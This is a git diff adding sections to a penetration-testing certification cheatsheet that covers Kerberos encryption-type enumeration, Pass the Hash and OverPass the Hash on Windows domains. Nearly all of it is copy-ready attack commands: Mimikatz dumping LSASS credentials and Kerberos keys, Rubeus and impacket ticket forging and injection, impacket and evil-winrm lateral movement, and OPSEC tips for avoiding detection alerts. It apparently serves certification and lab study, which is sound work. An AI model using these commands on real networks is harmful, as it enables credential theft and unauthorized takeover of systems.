@@ -42,7 +42,9 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
     - [Cracking Passwords](#cracking-passwords)
 - [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
+    - [Enumeration & Encryption Type Inspection](#Enumeration-and-Encryption-Type-Inspection)
     - [Pass the Hash(PTH)](#pass-the-hash)
+    - [OverPass the Hash(OtH)](#overpass-the-hash)
     - [Pass the Ticket from Windows(PtT)](#pass-the-ticket-from-windows)
     - [Pass the Ticket from Linux(PtT)](#pass-the-ticket-from-linux)
     - [Pass the Certificate(PtC)](#pass-the-certificate)
@@ -1189,6 +1191,53 @@ read path : https://academy.hackthebox.com/module/147/section/1315
 ```
 ## Windows Lateral Movement Techniques
 
+##### Enumeration and  Encryption Type Inspection
+```
+=========================
+From Windows
+=========================
+# PowerView - Inspect Kerberos supported encryption types for Domain Controllers
+Get-DomainController | Get-DomainObject -Properties msds-supportedencryptiontypes
+
+# PowerView - Inspect Kerberos supported encryption types for a specific user
+Get-DomainUser -Identity username -Properties msds-supportedencryptiontypes
+
+# ActiveDirectory Module - Inspect Kerberos supported encryption types for a specific user
+Get-ADUser -Identity username -Properties "msDS-SupportedEncryptionTypes" | Select-Object Name, msDS-SupportedEncryptionTypes
+
+# ActiveDirectory Module - Inspect krbtgt supported encryption types to determine domain default TGT encryption
+Get-ADUser krbtgt -Properties msDS-SupportedEncryptionTypes | Select-Object Name, msDS-SupportedEncryptionTypes
+
+# Registry - Check local machine Kerberos supported encryption types policy
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" /v SupportedEncryptionTypes
+
+=========================
+From LInux
+=========================
+# Query LDAP via ldapsearch to check supported encryption types for all domain computers (28 = RC4 + AES128 + AES256)
+ldapsearch -x -H ldap://<DC_IP> -D "user@corp.com" -w 'Password' -b "DC=corp,DC=com" "(objectClass=computer)" msDS-SupportedEncryptionTypes cn
+
+# Query LDAP via ldapsearch to check supported encryption types for krbtgt account (0 = Default Domain Policy)
+ldapsearch -x -H ldap://<DC_IP> -D "user@corp.com" -w 'Password' -b "DC=corp,DC=com" "(sAMAccountName=krbtgt)" msDS-SupportedEncryptionTypes
+
+# Query LDAP to list Service Principal Names (SPNs) registered for a specific target host
+ldapsearch -x -H ldap://<DC_IP> -D "user@corp.com" -w 'Password' -b "DC=corp,DC=com" "(cn=WEB04)" servicePrincipalName
+
+# Check DC/Domain Kerberos encryption support using NetExec LDAP module
+nxc ldap <DC_IP> -u Username -p Password -M kerberos
+
+=========================
+Bitmask Reference
+=========================
+
+# Decode msDS-SupportedEncryptionTypes bitmask values:
+# 4  (0x04) = RC4_HMAC_MD5      (uses NTLM hash as key)
+# 8  (0x08) = AES128_CTS_HMAC_SHA1_96
+# 16 (0x10) = AES256_CTS_HMAC_SHA1_96
+# 28 (0x1C) = AES128 + AES256 only (RC4 disabled — must use AES key)
+# 31 (0x1F) = All types enabled
+
+```
 ##### Pass the Hash
 ```
 # Pass the Hash from Windows Using Mimikatz to spawn new cmd.exe process under the identity of user julio using their NTLM hash
@@ -1217,6 +1266,172 @@ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF345
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+# Spawn a new cmd.exe process under the identity of target user using Mimikatz Pass-the-Hash
+mimikatz.exe privilege::debug "sekurlsa::pth /user:username /NTLM:<NTLM_HASH> /domain:domain.com /run:cmd.exe" exit
+
+```
+##### OverPass the Hash
+```
+=========================
+From Windows
+=========================
+# --- Dump credentials from LSASS ---
+
+# Dump all cached password hashes and Kerberos keys from LSASS memory
+mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
+# → Gets NTLM hash (RC4 equivalent)
+
+# Dump Kerberos encryption keys (AES128, AES256, RC4) from LSASS
+mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
+# → Gets AES256_HMAC and AES128_HMAC keys — use these for OPSEC-safe OPtH
+
+# --- Method 1: Mimikatz sekurlsa::pth (requires admin + SeDebugPrivilege) ---
+
+# Spawn new PowerShell process with jen's NTLM hash injected into LSA session (RC4)
+mimikatz.exe privilege::debug "sekurlsa::pth /domain:corp.com /user:username /rc4:<RC4_HMAC> /run:powershell" exit
+
+# Spawn new PowerShell process using AES256 key (OPSEC preferred — no RC4 downgrade alert)
+mimikatz.exe privilege::debug "sekurlsa::pth /domain:corp.com /user:username /aes256:<AES256_KEY> /run:powershell" exit
+
+# Spawn new cmd.exe using RC4/NTLM hash — note: whoami will still show original user (expected behavior)
+mimikatz.exe privilege::debug "sekurlsa::pth /domain:corp.com /user:username /rc4:<RC4_HMAC>" exit
+
+# After spawning new process — trigger TGT request by accessing network resource
+# Run this in the NEW PowerShell window spawned by Mimikatz:
+net use \\files04
+# → Forces KDC to issue TGT + TGS for the target user
+
+# Verify TGT and TGS have been cached in the new session
+klist
+# Expected: #0 krbtgt/CORP.COM (TGT) + #1 cifs/files04 (TGS)
+
+# --- Method 2: Rubeus asktgt — preferred (no LSASS touch required) ---
+
+# Request TGT using RC4/NTLM hash and inject directly into current session (/ptt)
+.\Rubeus.exe asktgt /user:Administrator /domain:corp.com /rc4:<NTLM_HASH> /ptt
+
+# Request TGT using AES256 key — no encryption downgrade, blends with normal traffic and inject ticket into current session (/ptt)
+.\Rubeus.exe asktgt /user:jen /domain:corp.com /aes256:<AES256_KEY> /ptt /opsec
+# /opsec flag: requests ticket matching domain's encryption policy (avoids anomalies)
+
+# Request TGT using AES128 key and inject ticket into current session (/ptt)
+.\Rubeus.exe asktgt /user:jen /domain:corp.com /aes128:<AES128_KEY> /ptt
+
+# Request TGT and pass to a hidden sacrificial process (for token stealing, requires elevation)
+.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /createnetonly:C:\Windows\System32\cmd.exe
+
+# Request TGT with auto-renew enabled — background thread renews before expiry
+.\Rubeus.exe asktgt /user:jen /rc4:<NTLM_HASH> /ptt /autorenew
+
+# Manually renew an existing TGT before it expires (within renewable period)
+.\Rubeus.exe renew /ticket:<base64_TGT> /ptt
+
+# Export TGT to base64 string for use on other machines
+.\Rubeus.exe dump /luid:0xfc4b4c /service:krbtgt /nowrap
+
+# List all currently cached Kerberos tickets in session
+.\Rubeus.exe klist
+
+# --- After TGT is in cache — use Kerberos-aware tools ---
+
+# Request TGS for specific RDP service using cached TGT
+.\Rubeus.exe asktgs /service:TERMSRV/web04.corp.com /ptt
+
+# Request TGS for WinRM service using cached TGT
+.\Rubeus.exe asktgs /service:WSMAN/web04.corp.com /ptt
+
+# Verify tickets cached — confirm etype matches domain policy (should be AES256, not RC4)
+klist
+
+# Use PsExec with cached Kerberos TGT — no password needed (ticket reuse)
+cd C:\Tools\SysinternalsSuite\
+.\PsExec.exe \\files04 cmd
+
+# Clear all tickets from current session (use before injecting new TGT)
+klist purge
+
+=========================
+From Linux
+=========================
+# --- Step 1: Dump credentials (do on compromised Windows host with Mimikatz first) ---
+
+# Extract NTLM hash and AES keys from LSASS memory (requires admin + SeDebugPrivilege)
+mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
+# → Gives both RC4_HMAC (= NTLM hash) and AES128/AES256 keys
+
+# --- Step 2: Request TGT from KDC using hash or key ---
+
+# Request TGT using NTLM hash (RC4) — works if RC4 not disabled in domain
+impacket-getTGT corp.com/jen -hashes :369def79d8372408bf6e93364cc93075 -dc-ip 192.168.50.70
+
+# Request TGT using AES256 key — preferred for OPSEC, no encryption downgrade alert
+impacket-getTGT corp.com/jen -aesKey <AES256_KEY> -dc-ip 192.168.50.70
+
+# Request TGT using plaintext password (if available)
+impacket-getTGT corp.com/jen:'Nexus123!' -dc-ip 192.168.50.70
+
+# --- Step 3: Export ccache ticket file into Kerberos environment variable ---
+
+# Set KRB5CCNAME to point at the obtained TGT ccache file
+export KRB5CCNAME=jen.ccache
+
+# Verify the TGT is valid — check principal and expiry time
+klist
+
+# --- Step 4: Use TGT with Kerberos-aware tools (-k -no-pass) ---
+
+# Lateral movement via WMI using Kerberos ticket — no password needed
+impacket-wmiexec -k -no-pass corp.com/jen@web04.corp.com
+
+# Lateral movement via psexec using Kerberos ticket
+impacket-psexec -k -no-pass corp.com/jen@web04.corp.com
+
+# Lateral movement via smbexec using Kerberos ticket
+impacket-smbexec -k -no-pass corp.com/jen@web04.corp.com
+
+# --- Optional: Request TGS for specific service (if needed for targeted auth) ---
+
+# Request Service Ticket (TGS) for RDP service using existing TGT
+impacket-getST corp.com/Administrator -spn TERMSRV/web04.corp.com -k -no-pass -dc-ip 192.168.50.70
+
+# Request Service Ticket (TGS) for WinRM service using existing TGT
+impacket-getST corp.com/Administrator -spn WSMAN/web04.corp.com -k -no-pass -dc-ip 192.168.50.70
+
+# Update KRB5CCNAME to use the new TGS ticket for specific service
+export KRB5CCNAME='Administrator@TERMSRV_web04.corp.com@CORP.COM.ccache'
+
+# --- Alternative: evil-winrm with Kerberos ticket (WinRM/WSMAN) ---
+
+# Connect via WinRM using ccache ticket file directly (-K = ticket file, K uppercase)
+evil-winrm -i web04.corp.com -r CORP.COM -K Administrator.ccache
+
+# Connect via WinRM using KRB5CCNAME environment variable
+export KRB5CCNAME=Administrator.ccache
+evil-winrm -i web04.corp.com -r CORP.COM
+
+# Connect via WinRM using NTLM hash (fallback when Kerberos path fails)
+evil-winrm -i web04.corp.com -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
+
+# --- RDP via Kerberos ticket (xfreerdp) ---
+# NOTE: Must use FQDN (not IP) — Kerberos requires hostname for SPN matching
+
+# RDP using NLA with Kerberos ticket from KRB5CCNAME
+xfreerdp /v:web04.corp.com /u:Administrator /d:corp.com /sec:nla /cert:ignore /tls-seclevel:0 +clipboard /dynamic-resolution
+
+# RDP using NTLM hash directly (bypass Kerberos) — use IP here, no SPN needed
+xfreerdp /v:<WEB04_IP> /u:Administrator /d:corp.com /pth:2892D26CDF84D7A70E2EB3B9F05C425E /cert:ignore /tls-seclevel:0 +clipboard
+
+# --- Legacy method using ktutil + kinit (alternative TGT import) ---
+
+# Add NTLM hash to keytab file using ktutil
+ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hmac-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
+
+# Obtain TGT using keytab file
+kinit -t ~/mykeys tgwynn@LAB.ROPNOP.COM
+
+# Verify obtained ticket
+klist
 
 ```
 ##### Pass the Ticket from Windows
